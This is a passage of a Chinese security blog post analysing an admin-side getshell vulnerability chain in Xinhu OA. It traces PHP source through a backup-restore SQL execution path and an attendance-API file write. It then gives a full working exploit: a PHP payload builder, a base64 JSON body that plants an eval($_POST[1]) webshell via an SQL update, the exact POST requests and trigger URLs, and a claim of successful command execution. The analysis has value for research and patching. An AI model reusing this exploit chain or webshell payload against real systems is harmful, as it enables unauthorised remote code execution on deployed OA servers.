+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function getone($where, $fields=&#x27;*&#x27;, $order=&#x27;&#x27;)</span><br><span class="line">&#123;</span><br><span class="line">	return $this-&gt;db-&gt;getone($this-&gt;table, $where, $fields, $order);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>反正是从数据库中获取的，并且没有对其进行过滤</p>
+<p><strong>利用思路</strong></p>
+<ol>
+<li><code>insert data -&gt;  flow_set</code>数据表</li>
+<li>执行inputAction 方法</li>
+<li>代码执行</li>
+</ol>
+<p>能insert数据的地方有好几个，最初是选用同一文件位于88行<code>flowsetsavebefore()</code>方法</p>
+<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240724173808725.png"></p>
+<p>不过这里可以看到过滤非常严格，而我们写的马需要注释符<code>/**/</code>以及<code>()</code>，所以这条路是走不通的。</p>
+<p>继续翻代码，找到也有执行SQL语句的<code>webmain\system\beifen\beifenAction.php</code>的<code>huifdatanewAjax()</code></p>
+<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240724175433613.png"></p>
+<p>首先我们是管理员账号，所以不用去管参数<code>$adminid</code>是否为1。接着POST接收参数<code>folder</code>和<code>sid</code>，获取数据库所有表名，继续检查给定路径下的文件是否存在，如果存在则执行<code>m(&#39;beifen&#39;)-&gt;getbfdata()</code>方法，跟进一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getbfdata</span>(<span class="params"><span class="variable">$file</span>, <span class="variable">$path</span>=<span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$str</span> 	= <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$path</span>==<span class="string">&#x27;&#x27;</span>)<span class="variable">$path</span>	= <span class="string">&#x27;&#x27;</span>.ROOT_PATH.<span class="string">&#x27;/&#x27;</span>.UPDIR.<span class="string">&#x27;/data/&#x27;</span>.<span class="variable">$file</span>.<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$path</span>))&#123;</span><br><span class="line">        <span class="variable">$cont</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$cont</span>, <span class="number">0</span>, <span class="number">2</span>) != <span class="string">&#x27;&#123;&quot;&#x27;</span>)&#123;</span><br><span class="line">        	<span class="variable">$cont</span> = <span class="variable language_">$this</span>-&gt;rock-&gt;jm-&gt;<span class="title function_ invoke__">mcrypt_decrypt</span>(<span class="variable">$cont</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$str</span>  = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$cont</span>, <span class="literal">true</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用<code>file_get_contents()函数</code>读取json数据，然后json解码</p>
+<p>解码后的数据存储在<code>$data</code>中，然后获取<code>$data[tab]</code>的数据判断文件表是否存在</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$tab</span>, <span class="variable">$alltabls</span>))&#123;</span><br><span class="line">    <span class="variable">$createsql</span> = <span class="title function_ invoke__">arrvalue</span>(<span class="variable">$dataarr</span>, <span class="string">&#x27;createsql&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$createsql</span>)&#123;</span><br><span class="line">    	<span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$createsql</span>, <span class="literal">false</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果不存在调用<code>arrvalue()</code>方法，跟进一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*	在数组里读取变量</span></span><br><span class="line"><span class="comment">*	<span class="doctag">@return</span> value</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arrvalue</span>(<span class="params"><span class="variable">$arr</span>, <span class="variable">$k</span>, <span class="variable">$dev</span>=<span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$val</span>  = <span class="variable">$dev</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$arr</span>[<span class="variable">$k</span>]))<span class="variable">$val</span>= <span class="variable">$arr</span>[<span class="variable">$k</span>];</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$val</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>相当于是获取<code>$data[$tab][&#39;createsql&#39;]</code>的值。如果<code>$createsql</code>存在，执行<code>query()</code>方法</p>
+<p>其他都可控主要上传的图片文件名都是随机的。想要执行sql语句就必须控制文件名。</p>
+<p>比如上传文件返回随机文件名a.png，那么文件内容必须为</p>
+ <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span><span class="string">&quot;a.png&quot;</span> =&gt; <span class="punctuation">[</span><span class="string">&quot;createsql&quot;</span> =&gt; <span class="string">&quot;select 1&quot;</span><span class="punctuation">]</span><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>
+
+<p> 我们无法提前预知生成的文件名，那这条路也就走不通</p>
+<p>通过翻找代码，找到<code>webmain\task\openapi\openkqjAction.php</code>的<code>apiAction()</code>方法</p>
+<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725113419460.png"></p>
+<p>这里有判断请求方式，如果为POST请求且不为空那么调用<code>kqjcmd</code>类的<code>postdata()</code>方法</p>
+<p>跟进一下，这里对POST请求数据进行json解码并赋值给<code>$barr</code>，然后foreach遍历赋值给<code>$dtype</code></p>
+<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725114029401.png"></p>
+<p>我们往下看，如果存在headpic键那么调用<code>saveheadpic()</code>方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if($dtype==&#x27;headpic&#x27;)&#123;</span><br><span class="line">	$this-&gt;saveheadpic($snid, $rs[&#x27;ccid&#x27;], $rs[&#x27;headpic&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>继续跟进<code>saveheadpic()</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">private function saveheadpic($snid, $uid, $headpic, $face=&#x27;&#x27;)</span><br><span class="line">&#123;</span><br><span class="line">	$where = &quot;`snid`=&#x27;$snid&#x27; and `uid`=&#x27;$uid&#x27;&quot;;</span><br><span class="line">	if(isempt($face))&#123;</span><br><span class="line">		if(isempt($headpic))return;</span><br><span class="line">		$face  = &#x27;&#x27;.UPDIR.&#x27;/face/kqj&#x27;.$snid.&#x27;_u&#x27;.$uid.&#x27;.jpg&#x27;; //头像保存为图片</span><br><span class="line">		$this-&gt;rock-&gt;createtxt($face, base64_decode($headpic));</span><br><span class="line">	&#125;</span><br><span class="line">	$arr[&#x27;headpic&#x27;] = $face;</span><br><span class="line">	if($this-&gt;kquobj-&gt;rows($where)==0)&#123;</span><br><span class="line">		$where = &#x27;&#x27;;</span><br><span class="line">		$arr[&#x27;snid&#x27;] = $snid;</span><br><span class="line">		$arr[&#x27;uid&#x27;]  = $uid;</span><br><span class="line">	&#125;</span><br><span class="line">	$this-&gt;kquobj-&gt;record($arr, $where);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的路径以及文件名可控，然后对<code>$headpic</code>进行base64解码</p>
+<hr>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>首先insert一条flow_set数据（ps：直接用sql insert太麻烦了直接正常构造一个正常数据，然后sql update）</p>
+<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725122108889.png"></p>
+<p>新增模块列表，填写下基本信息</p>
+<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725182332200.png"></p>
+<p>然后提交抓包查看下对应id，结果为161</p>
+<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725182519855.png"></p>
+<p>然后构造payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;kqj1_u1.jpg&quot;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&quot;createsql&quot;</span> =&gt; <span class="string">&quot;update xinhu_flow_set set name=\&quot;*/eval(\$_POST[1]);/*\&quot; where id = 161;&quot;</span></span><br><span class="line">    )</span><br><span class="line">);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$arr</span>));</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注：这里的可控文件名<code>kqj1_u1.jpg</code>在前面分析过，id为我们刚刚创建的模块列表id，<code>$</code>符号前要加<code>\</code>防转义</p>
+</blockquote>
+<p>然后根据我们的链子来构造路由，POP链如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openkqj::apiAction() -&gt; kqjcmd::postdata() -&gt; kqjcmd::saveheadpic()</span><br></pre></td></tr></table></figure>
+
+<p>构造POST请求包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php/post?d=task&amp;m=openkqj|openapi&amp;a=api&amp;sn=1 HTTP/1.1</span><br><span class="line"></span><br><span class="line">&#123;&quot;aasd&quot;:&#123;</span><br><span class="line">    &quot;data&quot;:&quot;headpic&quot;,</span><br><span class="line">    &quot;id&quot;:&quot;1&quot;,</span><br><span class="line">    &quot;headpic&quot;:&quot;eyJrcWoxX3UxLmpwZyI6eyJjcmVhdGVzcWwiOiJ1cGRhdGUgeGluaHVfZmxvd19zZXQgc2V0IG5hbWU9XCIqXC9ldmFsKCRfUE9TVFsxXSk7XC8qXCIgd2hlcmUgaWQgPSAxNjE7In19&quot;,</span><br><span class="line">    &quot;ccid&quot;:&quot;1&quot;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注：headpic为前面构造的payload，base64编码</p>
+</blockquote>
+<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725184458489.png"></p>
+<p>上传成功后，执行我们前面保存的文件中的sql语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?a=huifdatanew&amp;d=system&amp;m=beifen&amp;ajaxbool=true</span><br><span class="line"></span><br><span class="line">//POST传参</span><br><span class="line">folder=.*/./face&amp;sid=kqj1_u1.jpg</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725184754678.png"></p>
+<p>最后调用<code>webmain\main\flow\flowAction.php</code>的<code>inputAction()</code>方法，将木马拼接到文件中触发漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?a=input&amp;m=flow&amp;d=main&amp;id=1&amp;setid=161</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725194816122.png"></p>
+<p>直接访问<code>webmain\flow\input</code>目录下的<code>model_test123Action.php</code>文件，成功命令执行</p>
+<p>（这里test123是模块编号）</p>
+<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725195342296.png"></p>
+<p>也可以按照给定路由结构去访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?d=flow&amp;m=mode_test123|input</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725195642297.png"></p>
+<p>以上就是整个信呼OA后台getshell的分析和利用</p>
+<hr>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/286380.html">https://www.freebuf.com/articles/web/286380.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/14920?time__1311=GqAh0KAKYK7Ie05DKB4CqiIdOn85GCtKfeD">https://xz.aliyun.com/t/14920?time__1311=GqAh0KAKYK7Ie05DKB4CqiIdOn85GCtKfeD</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"># 代码审计</a>
+              <a href="/tags/OA/" rel="tag"># OA</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html" rel="prev" title="ThinkPHP3漏洞探索">
+      <i class="fa fa-chevron-left"></i> ThinkPHP3漏洞探索
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/article/%E8%AE%B0%E5%BD%95%E6%9F%90%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html" rel="next" title="记录某靶场渗透测试">
+      记录某靶场渗透测试 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90"><span class="nav-number">1.</span> <span class="nav-text">信呼OA后台getshell分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">1.2.</span> <span class="nav-text">前置知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">1.3.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.4.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">1.5.</span> <span class="nav-text">参考文章</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="rev1ve"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">rev1ve</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">73</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">35</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2024-03 – 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">rev1ve</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'EbJd2uGnZROX6CGHpkKNkBAj-gzGzoHsz',
+      appKey     : 'KXq3KsjxZ28WDhwbOrLlm4Yw',
+      placeholder: "快来评论叭",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : 'https://ebjd2ugn.lc-cn-n1-shared.com'
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
